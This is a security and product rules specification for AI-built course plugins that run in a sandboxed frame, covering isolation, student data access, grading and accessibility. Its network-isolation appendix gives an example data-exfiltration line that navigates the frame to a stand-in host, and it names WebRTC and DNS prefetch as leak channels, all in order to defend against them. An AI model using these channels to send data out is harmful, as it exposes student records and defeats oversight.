# Studio Plugin Rules

The rules every Studio plugin must satisfy before it can exist. Studio is the course tab where a professor describes a teaching tool in plain words and Athena builds it. What Athena builds is a **plugin**: a small interactive tool that can be installed into one or more course sections, appearing as its own tab in each.

This document is the source of truth for three things that will be built from it:

1. **Athena's builder instructions.** The prompt that tells Athena how to build a plugin is derived from these rules.
2. **The pre-publish validator.** An automated check runs on every plugin before a professor can publish it, and rejects any plugin that breaks a rule tagged *pre-publish check*.
3. **The runtime.** The part of Scholera that hosts plugins is built so that rules tagged *runtime* can't be broken at all.

If you change a rule here, change whichever of those three enforces it in the same pull request.

| | |
|---|---|
| **Status** | Review |
| **Version** | 2 (2026-09-30: reusable plugins, rule 2.4 rewritten, network isolation appendix) |
| **Owner** | Kevin Dohsi |
| **Date** | 2026-09-29 |

## Which document owns what

Other Studio documents cite rules by number and never restate them. If one of them disagrees with this file, this file wins and the other is the bug.

| Document | Owns |
|---|---|
| This file | The product and security rules, and how each is enforced |
| [studio-plugin-manifest.md](./studio-plugin-manifest.md) | The manifest contract: fields, validation, versions |
| [studio-plugin-storage.md](./studio-plugin-storage.md) | How plugins and their data are stored: tables, database guarantees, upgrades, what's deferred |
| [studio-plugin-server.md](./studio-plugin-server.md) | The trusted server layer: who may read and write which records, validation, lifecycle operations, audit |
| [studio-supabase-acceptance.md](./studio-supabase-acceptance.md) | The steps that turn "complete locally" into "fully accepted" on a machine with local Supabase |
| `docs/superpowers/plans/2026-09-29-studio-f1-runtime.md` | How the runtime slice (F1) is built, task by task |
| `docs/designs/studio/*.md` | Design sketches. Gitignored, so nothing only written there survives. Anything decided there must also land here, in the manifest doc or in the plan |

## Words used in this document

- **Studio.** The course tab where a professor builds plugins with Athena. It's a development environment, not a place students go.
- **Plugin.** The general word for what Studio builds. When a rule needs to be precise, it uses one of the next three terms.
- **Plugin project.** A plugin's reusable source, owned by the professor who builds it, inside one institution. It's edited in Studio and has a history of versions.
- **Plugin version.** One immutable snapshot of a project: its code, its manifest and its build output. Once published, it never changes.
- **Plugin installation.** One plugin version attached to exactly one course section. It holds that section's approval, data and state, and it's what appears as a course tab.
- **Manifest.** A plugin version's declaration of what it is. It lists its purpose, its views, the data it stores, the signals it tracks, the skills its scores count toward, and the capabilities it asks for. The platform trusts the manifest, not the plugin's code. The contract is in [studio-plugin-manifest.md](./studio-plugin-manifest.md).
- **Host.** The Scholera page that shows a plugin. It owns the course sidebar, the header and the signed-in session.
- **Plugin runtime.** Where plugin code runs. In version 1 that's a **sandboxed frame**: an isolated box inside the host page, run by the browser. The browser gives it a throwaway origin (the identity a browser uses to decide what a page may access). So it can't see Scholera's cookies, session or storage. The sandbox alone does not stop network requests; see the [network isolation appendix](#appendix-network-isolation-in-the-sandboxed-frame).
- **Scholera Bridge.** The only way a plugin talks to Scholera. The plugin sends a message to the host. The host checks it, does the work on the server, and sends back the result. "The bridge" below means the Scholera Bridge.
- **Capability.** One named thing the bridge can do for a plugin, like "record audio", "save a response" or "report a score". A plugin can only use capabilities its manifest lists and the professor approved.
- **Plugin kit.** The set of Scholera interface components and theme colors that plugin screens are built from.
- **Signal.** A standard tracking event, such as *completed*, *score*, *time spent*, *attended* or *submitted*. It's drawn from one fixed list shared by every plugin.

## The principle above every rule

**A rule is enforced by the platform, not only requested of the AI.** Telling Athena "don't read other students' data" in a prompt is a hope, not a rule. So every rule below is tagged with how it's enforced:

- **Runtime.** The plugin physically can't break it, because the sandbox or the bridge makes it impossible.
- **Pre-publish check.** The automated validator rejects a plugin that breaks it.
- **Professor approval.** The professor sees it and signs off before publishing, the way a phone asks before an app uses the camera.

Some rules carry two tags. Where one depends on the professor, the other still applies.

This is how Scholera already works elsewhere. Athena's student tools can't accept IDs by construction, and the About-page assistant can't touch image fields by code, not by instruction. These rules apply the same idea to plugins.

---

## 1. Isolation

Protects Scholera from the plugin's code.

- **1.1** A plugin runs only inside the sandboxed frame, which is never granted same-origin access. *Runtime.*
- **1.2** A plugin has no network access except the bridge. The sandbox alone doesn't provide this. The frame's content security policy (the browser rule list that controls what a page may load or contact) blocks direct requests, and the channels that policy doesn't cover are closed or detected separately. The [appendix](#appendix-network-isolation-in-the-sandboxed-frame) lists every requirement, and each is checked by a browser probe. *Runtime.*
- **1.3** A plugin never holds a secret. It gets no API key, no token and no session. *Runtime: it has no way to reach one.*
- **1.4** Anything that needs real power goes through a capability, and the host performs it. That covers the microphone, the camera, AI, storage and grades. So recording happens in Scholera's own recorder, not in plugin code. *Runtime.*
- **1.5** A plugin can only use capabilities its manifest lists and the professor approved for that installation. Approval belongs to the installation, not the version. Installing the same version in another section needs that section's own approval. *Runtime and professor approval.*

## 2. Identity and access

Protects students from each other, and institutions from each other.

- **2.1** A plugin never names *who* or *where*. Bridge calls carry no user, section or institution IDs. The host fills those in from the signed-in session. Athena's student tutor follows the same rule. It makes reaching another student's or another school's data impossible by construction. *Runtime.*
- **2.2** Every bridge call is re-authorized on the server, as if an attacker had sent it. *Runtime.*
- **2.3** A plugin sees only what the viewer's role may see. A student's view can read the student's own records and anything the professor marked as visible to the class. The professor's view and the TA or grader view can read the whole section. *Runtime.*
- **2.4** A plugin version can be installed in several course sections, but each installation belongs to exactly one section. Each installation has its own data, capability approval and state. No installation can read another's, even when both run the same version. The manifest names no institution, course, section or user, so a version carries nothing tied to one section. In version 1, a project can be installed only in sections of its own institution. *Runtime.*

## 3. Data and tracking

What gets stored, where, and for how long.

- **3.1** Plugin data lives only in Scholera's storage, never in the frame. The frame can't use browser storage, so anything the platform doesn't hold is gone on reload. *Runtime.*
- **3.2** Every plugin declares the shape of its data in its manifest: its collections, their fields, and which records belong to a student. The server rejects any write that doesn't match. *Runtime.*
- **3.3** Every record is stamped with its institution, section, installation, plugin version, collection and author by Scholera's trusted server, never by the plugin. The plugin can't forget the institution, because it never supplies it. *Runtime.*
  - **No client reaches plugin storage directly.** Row-level security (the Postgres feature that filters rows by who is asking) is on with no client policies, and client privileges are revoked. That is default deny.
  - **The trusted server decides what each viewer sees.** It reads the collection's access rule from the installation's manifest and the viewer's role in the section. A record doesn't store its own visibility, because a later version's manifest can change a collection's rule.
  - **The database is the second line of defense.** Constraints, foreign keys and institution guards refuse a record in the wrong section or institution, or under a version that installation never approved, even if the server has a bug.
- **3.4** Tracking uses the shared signal list, not plugin-invented events. That lets professor dashboards and analytics add up across every plugin in a course. *Pre-publish check.*
- **3.5** Every write is recorded in the audit log (`logEvent`) automatically, with no plugin code involved. *Runtime.*
- **3.6** Uninstalling a plugin archives its data instead of deleting it, so past results stay readable. Permanent deletion is a separate, explicit professor action. *Professor approval.*
- **3.7** Recordings and uploads go into Scholera's private storage. The plugin only ever receives short-lived playback links, never a storage path. *Runtime.*

## 4. Course memory

How a plugin reads and feeds what the course already knows. Course memory is the section's extracted materials, its skills and mastery scores, and its search index.

- **4.1** A plugin reads course memory only through capabilities scoped to its own section. Those capabilities are course search (the existing retrieval, with page citations), the skill list and the material outline. The class's weak spots are available only in the professor view and the TA or grader view. *Runtime.*
- **4.2** A plugin never writes to extracted materials or the search index directly. *Runtime: no such capability exists.*
- **4.3** A plugin feeds course memory by declaring which skills its scores count toward. Those scores go through the same grade hook as quizzes, so skill mastery updates automatically. The validator confirms every declared skill exists in that section. *Pre-publish check.*
- **4.4** In version 1, what students write or say inside a plugin is not added to the search index. That includes answers and transcripts. Student-created content would be a new class of sensitive data, and it needs an explicit decision under `.claude/rules/vector-db.md` first. *Runtime.*
- **4.5** A student's view can never read class-wide information about other students. *Runtime.*

## 5. Grading integrity

Grades stay the professor's decision.

- **5.1** A plugin can report a score, but it never writes a grade. A score from an exact answer key can be released automatically if the professor turned that on. A score judged by AI is always a suggestion the professor commits, the same as Scholera's AI grading today. *Runtime and professor approval.*
- **5.2** Answer keys never reach a student's frame. Keys live in a private collection the bridge never returns to a student, and scoring runs on the server. Otherwise any student could read the answers with the browser's developer tools. *Runtime.*
- **5.3** While a student is in a graded plugin attempt, Athena's tutor refuses to help. Quizzes use the same lock. *Runtime.*
- **5.4** Deadlines, time limits and late rules are enforced on the server. A countdown inside the plugin is for display only. *Runtime.*
- **5.5** A graded plugin appears as a gradebook column, in the category and at the weight the professor chooses. *Professor approval.*
- **5.6** Integrity monitoring, such as tab-switch or camera checks, comes only from the platform's proctoring capability. It's advisory and never changes a grade on its own. *Runtime.*

## 6. AI use

Cost, the kill switch, and student privacy.

- **6.1** Every AI call goes through the platform's AI capability, which runs on Athena's engine. It's recorded in the cost ledger, rate-limited per user, and runs on the model the platform chooses. A plugin never calls an AI provider itself. *Runtime.*
- **6.2** Studio plugins have their own group in the AI kill switch. When AI is switched off, a plugin must keep working without it, or tell the user in plain language what's unavailable. The manifest declares which. *Runtime and pre-publish check.*
- **6.3** AI requests carry a student's work, never their identity. The host removes names and emails, and the plugin has no way to add them. *Runtime.*
- **6.4** When a plugin asks the AI about course material, the host grounds the request in course search. The answer comes back with page citations, and it says so honestly when the materials don't cover the question, the same way the tutor does. *Runtime.*
- **6.5** AI output is treated as untrusted text. It's displayed as sanitized text or markdown and never run as code. *Runtime.*

## 7. Design and accessibility

Every plugin looks and works like Scholera.

- **7.1** Plugin screens are built only from the plugin kit and the theme tokens the host provides. External stylesheets and fonts are blocked, and the validator rejects hard-coded colors. *Runtime and pre-publish check.*
- **7.2** Light and dark mode follow the host automatically. *Runtime.*
- **7.3** Every view works on a phone. Touch targets are at least 44 pixels, and nothing scrolls sideways at phone width. The validator renders the plugin at phone size to check. *Pre-publish check.*
- **7.4** Plugins meet WCAG AA, the web accessibility standard. Every control can be reached by keyboard and has a label for screen readers. Every animation respects the viewer's "reduce motion" setting. The validator runs an automated accessibility scan. *Pre-publish check.*
- **7.5** Every view has an empty state, a loading state and a plain-language error state. A raw error message never reaches the screen. *Pre-publish check. The kit components provide these states.*
- **7.6** The host keeps the course sidebar, breadcrumb and header. The plugin owns only the content area. *Runtime.*

## 8. Lifecycle

How a plugin is approved, published, changed and rolled back.

- **8.1** A plugin moves through four stages: draft, preview, published and archived. Only the section's professor can edit or publish it. TAs and graders can use a published plugin but not change it. *Runtime.*
- **8.2** Before a plugin is first installed in a section, and again before every new version becomes active in that installation, the professor sees a plugin card and approves it. Nothing reaches that section's students without this approval. It says what the plugin does, which capabilities it asks for, what data it collects, which signals it tracks, whether it's graded, and its estimated AI cost. *Professor approval.*
- **8.3** A professor can preview any draft as a student, with sample data, before publishing it. *Runtime.*
- **8.4** A published version is frozen. Editing it creates a new draft. Moving an installation to a newer version never moves an attempt already in progress: a student finishes on the version they started. *Runtime.*
- **8.5** A professor can roll an installation back to any earlier published version in one step. Other installations of the same project are unaffected. *Runtime.*
- **8.6** An installed plugin becomes a course tab. It follows the same controls as built-in features: the professor's own sidebar arrangement, and whether it's published to students. *Runtime.*
- **8.7** Every plugin declares which bridge version it was built against, and the platform keeps older versions working. A plugin built this year must not break when Scholera changes next year. *Runtime.*

## 9. Edtech fit

Requirements that come from being inside a school.

- **9.1** Time limits live on the server (rule 5.4). So when the platform supports formal accommodations such as extended time, they apply to every plugin automatically. *Runtime.*
- **9.2** Student records never leave Scholera. A plugin can't send data anywhere (rule 1.2), and exports belong to the professor, through the platform. *Runtime.*
- **9.3** Studio is a sellable product. If an institution loses it, its plugins stop accepting new work, but past results stay readable. *Runtime.*
- **9.4** Plugins have views only for Scholera's own roles: professor, TA or grader, and student. A plugin can't invent a role. *Runtime.*
- **9.5** Plugins notify people only through the platform's notification bell and to-do list, with a cap per plugin. A plugin can never email or message a student directly. *Runtime.*
- **9.6** Studio only builds tools for teaching, learning or running the course. Athena declines a build with any other purpose. *Pre-publish check.*

## 10. Limits

- **10.1** Every limit is a named platform setting, never a promise made inside a plugin. The limits are maximum plugin size, bridge calls per minute per viewer, storage per plugin per section, record size, recording length, and AI spend per student per day and per section. *Runtime.*
- **10.2** Each limit's value is set in the Studio slice that first needs it. The runtime slice, for example, sets plugin size and call rate. The limits that affect a plugin are shown on its plugin card. *Runtime.*

---

## Appendix: where plugin code runs

| | Version 1 | Later, only where genuinely needed |
|---|---|---|
| Plugin code | Client side only, in the sandboxed frame | Controlled server-side execution, such as plugin-written scoring (rule 5.2), in an isolated container |
| Talking to Scholera | The Scholera Bridge, and nothing else | The same bridge |
| Real power (data, AI, grades, media) | Server-side platform capabilities, run by the host | The same |
| Building and checking a version | Runs in the app for the internal test plugin | Containerized build and pre-publish validation of AI-written code, including the phone-size render (7.3) and accessibility scan (7.4). Cloud Run Jobs fit |

## Appendix: network isolation in the sandboxed frame

Rule 1.2 is the rule most easily assumed to be met when it isn't. A `sandbox` attribute without `allow-same-origin` gives the frame a throwaway origin, which keeps Scholera's cookies and storage out of reach. It does **not** stop the frame from sending requests. Cross-origin rules only stop a page from reading a response, and data leaves in the request. So each requirement below is needed on top of the sandbox, and each gets a browser probe in the runtime slice.

**The frame's origin**

- **N1.** The sandbox grants `allow-scripts` and nothing else. It never grants `allow-same-origin`. A `srcdoc` frame (one whose HTML is injected by the host) would otherwise share Scholera's origin, and a same-origin frame with scripts can remove its own sandbox. Forms, popups, top navigation, modals and downloads stay off too.
- **N2.** The host accepts a message only when `event.source` is its own frame's window. Every sandboxed frame's origin reads `"null"`, so the origin can't identify the sender.
- **N3.** The host can't name a `"null"` origin when it replies, so replies go out with target `*`. So the host only ever posts results the viewer is already allowed to see, and only to the frame that asked.

**The content security policy**

- **N4.** The policy starts from `default-src 'none'` and sets `connect-src`, `img-src`, `media-src`, `frame-src`, `worker-src`, `form-action` and `base-uri` to `'none'` explicitly. `connect-src 'none'` covers `fetch`, `XMLHttpRequest`, WebSockets, `EventSource` and `sendBeacon`.
- **N5.** Scripts load only from the versioned runtime file and the plugin's own inline script, marked with a per-load nonce (a random value that authorizes one script tag).
- **N6.** Styles and fonts load only from Scholera's static asset paths, not the whole Scholera origin. The frame's origin is a different site from Scholera's, so the session cookie (`SameSite=Lax`) isn't sent with these loads. A probe confirms it.
- **N7.** The policy is delivered in a `<meta>` tag that is the first element of the frame's `<head>`, before anything that loads. A `<meta>` policy can't carry `frame-ancestors`, `sandbox` or violation reporting, so version 1 gets no violation reports.
- **N8.** A `srcdoc` frame also inherits the host page's own policy, and both apply. The frame's policy can only tighten what it inherits. Today the host sends only `frame-ancestors 'self'` (`next.config.ts`). A future host policy with its own script nonce would break the frame, so changing the host policy means re-running the Studio probes.

**Channels the policy doesn't cover**

- **N9.** *The frame navigating itself.* The sandbox stops navigation of the top page but not of the frame itself. So `location.href = 'https://anywhere/?data'` sends data out, and no policy directive blocks it. The host treats any second load of the frame as a breach and removes the frame, but the request has already gone. The real control is rule 2.3: the bridge gives each view only what its viewer may see, so the most a plugin can leak is what the viewer could already see. Whether that's enough for the professor view, which sees class-wide data, is an open decision before any capability returns other students' records.
- **N10.** *WebRTC.* A peer connection can reach outside servers, and browsers don't reliably apply the content security policy to it. The runtime removes the WebRTC constructors before plugin code runs, and the validator rejects code that references them. Neither is proof against a determined script, so a probe must confirm no connection can be opened.
- **N11.** *DNS prefetch.* A `<link rel="dns-prefetch">` can leak a hostname lookup that the policy may not govern. The frame document turns prefetch off (`x-dns-prefetch-control: off`), and a probe checks it.

**Later.** Serving the frame document from a dedicated origin with the policy as an HTTP header would add violation reporting and remove the coupling in N8. It's not required for version 1. Revisit it before plugins handle graded or class-wide data.
